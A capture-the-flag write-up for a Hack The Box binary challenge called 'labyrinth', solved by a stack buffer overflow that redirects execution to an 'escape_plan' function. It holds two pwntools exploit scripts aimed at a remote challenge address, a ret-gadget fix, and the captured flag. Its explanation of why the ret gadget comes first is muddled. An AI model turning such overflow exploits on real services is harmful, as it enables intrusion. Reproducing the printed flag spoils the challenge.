# labyrinth (WEB)

You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.

## Writeup

1. After debugging with ghidra, we can conclude two things
    1.1 There are two inputs, one is comparing first input with `69` or `069`.
    1.2 And we can simply overflow second input.

2. First try

2.1 Check offset using `cyclic` function in pwntools, it is `56`.
2.2 Second is the function address of `escape_plan`. we will get it using `x escape_plan` from `gdb`.

After making the payload, I have created a simple script.
```
from pwn import *

#target = process("./labyrinth")
target = remote("139.59.176.230", 31613)


payload = 'A' * 56
payload += p64(0x401255)

target.sendlineafter(">>", "69")
target.sendlineafter(">>", payload)
target.interactive()
```

Unfortunately, it didn't work. 
Now, as it is 64 bit binary, we can use return-oriented exploits. So I find the `ret` address from the binary using `ropper`

`ropper -f ./labyrinth`

And then I got the address of `ret`: `0x401016`.

Adding that to the script.

```
from pwn import *

#target = process("./labyrinth")
target = remote("139.59.176.230", 31613)


payload = 'A' * 56
payload += p64(0x401016)
payload += p64(0x401255)

target.sendlineafter(">>", "69")
target.sendlineafter(">>", payload)
target.interactive()
```

Remember, `ret` address is before the `excape_plan` address, because it is stack, which means the arguments are in reverse order.

Run the script and boom, we get our flag.

## Flag:

`HTB{3sc4p3_fr0m_4b0v3}`
